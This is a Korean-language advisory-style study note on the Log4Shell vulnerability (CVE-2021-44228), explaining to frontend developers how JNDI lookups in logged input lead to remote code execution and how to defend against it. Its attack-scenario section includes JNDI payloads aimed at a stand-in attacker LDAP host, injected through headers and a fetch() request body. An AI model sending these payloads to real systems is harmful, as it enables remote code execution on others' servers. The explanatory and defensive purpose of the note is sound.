# CVE-2021-44228 - Log4Shell

## 개요

| 항목 | 내용 |
|------|------|
| CVE ID | CVE-2021-44228 |
| CVSS | 10.0 (Critical) |
| 영향 패키지 | Apache Log4j 2 |
| 영향 버전 | 2.0-beta9 ~ 2.14.1 |
| 수정 버전 | 2.15.0 (불완전), 2.17.0 (완전 수정) |
| 공격 유형 | Remote Code Execution (RCE) |
| 발견일 | 2021-11-24 (공개: 2021-12-09) |

## 왜 프론트엔드 개발자가 알아야 하는가

프론트엔드 개발자가 직접 Log4j를 사용하지는 않지만, 다음 상황에서 직접적 영향을 받는다:

1. **BFF(Backend For Frontend) 패턴**: Node.js BFF가 Java 기반 마이크로서비스에 요청을 전달할 때, 사용자 입력(User-Agent, 검색어, 폼 데이터)이 그대로 Java 서비스의 로그에 기록됨
2. **SSR 서버**: Next.js, Nuxt 등이 Java 기반 API 서버와 통신하는 구조에서, 프론트에서 넘긴 헤더나 쿼리 파라미터가 공격 벡터가 됨
3. **Elasticsearch/Logstash**: 프론트엔드 에러 로그를 ELK 스택에 전송하는 경우, Logstash가 Log4j를 사용
4. **공급망 인식**: 내 코드가 아닌 의존성의 의존성에서 발생하는 치명적 취약점의 대표 사례

## 취약점 기술 분석

Log4j 2는 로그 메시지 내에서 **JNDI(Java Naming and Directory Interface) Lookup**을 지원한다. 로그에 기록되는 문자열 중 `${jndi:ldap://...}` 패턴을 만나면, Log4j가 해당 LDAP 서버에 접속하여 Java 객체를 다운로드하고 실행한다.

```java
// 취약한 코드 - 사용자 입력을 그대로 로깅
logger.info("User-Agent: " + request.getHeader("User-Agent"));
```

공격자가 User-Agent에 `${jndi:ldap://attacker.com/exploit}`를 넣으면:
1. Log4j가 문자열 내 `${...}` 표현식을 파싱
2. JNDI lookup을 수행하여 attacker.com LDAP 서버에 접속
3. 악성 Java 클래스를 다운로드
4. 해당 클래스의 생성자 또는 static initializer가 실행됨 → **RCE**

## 공격 시나리오

```javascript
// 프론트엔드에서 보내는 요청이 공격 벡터가 되는 예시
const searchQuery = "${jndi:ldap://attacker.com:1389/exploit}";

fetch('/api/search', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Custom-Header': '${jndi:ldap://attacker.com/a}'
  },
  body: JSON.stringify({ query: searchQuery })
});
// Java 백엔드에서 이 값을 로깅하는 순간 RCE 발생
```

## 방어 방법

### 즉각 조치
```bash
# JVM 옵션으로 lookup 비활성화 (2.10 이상)
-Dlog4j2.formatMsgNoLookups=true
# 환경 변수
LOG4J_FORMAT_MSG_NO_LOOKUPS=true
```

### 프론트엔드 개발자의 방어
1. **입력 검증**: `${` 패턴이 포함된 사용자 입력을 필터링/이스케이프
2. **WAF 규칙**: CloudFront, Cloudflare에서 JNDI 패턴 차단 규칙 설정
3. **의존성 스캔**: `npm audit`, Snyk, Dependabot으로 간접 의존성 모니터링

### 장기 전략
- 제로 트러스트: 외부 입력은 항상 위험하다고 가정
- 아웃바운드 네트워크 제한: 서버에서 임의 외부 서버로의 LDAP/RMI 연결 차단
- 정기적인 의존성 업데이트 파이프라인 구축

## 교훈 & 프론트엔드 적용 포인트

1. **로깅 ≠ 안전**: 사용자 입력을 로깅하는 행위 자체가 공격 벡터가 될 수 있다
2. **공급망 보안**: 내 코드에 없어도, 의존 체인 어딘가의 취약점이 전체 시스템을 무너뜨린다
3. **입력 검증은 프론트에서도**: 프론트엔드가 전달하는 모든 데이터는 백엔드 공격 벡터가 될 수 있음
4. **Defense in Depth**: 프론트 필터링 + WAF + 백엔드 검증 + 네트워크 격리

## 참고 자료

- [NVD - CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security](https://logging.apache.org/log4j/2.x/security.html)
- [LunaSec Log4Shell 분석](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [GitHub Advisory GHSA-jfh8-c2jp-5v3q](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q)
